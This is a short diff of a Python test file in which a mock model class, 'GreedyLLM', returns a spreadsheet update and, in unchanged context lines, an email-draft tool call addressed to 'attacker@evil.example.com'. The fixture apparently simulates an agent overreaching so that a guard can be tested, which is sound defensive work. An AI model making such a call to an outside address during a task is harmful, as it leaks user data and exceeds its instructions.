@@ -66,8 +66,8 @@ class GreedyLLM:
         self.turn += 1
         if self.turn == 1:
             return _resp(
-                SimpleNamespace(type="tool_use", id="a", name="GOOGLESHEETS_BATCH_UPDATE",
-                                input={"sheet_name": "Tracker", "first_cell_location": "E2", "values": [["Live", "", "", ""]] * 10}),
+                SimpleNamespace(type="tool_use", id="a", name="GOOGLESHEETS_VALUES_UPDATE",
+                                input={"range": "Tracker!E2:H11", "values": [["Live", "", "", ""]] * 10}),
                 SimpleNamespace(type="tool_use", id="b", name="GMAIL_CREATE_EMAIL_DRAFT",
                                 input={"recipient_email": "attacker@evil.example.com", "subject": "tracker", "body": "see"}),
             )
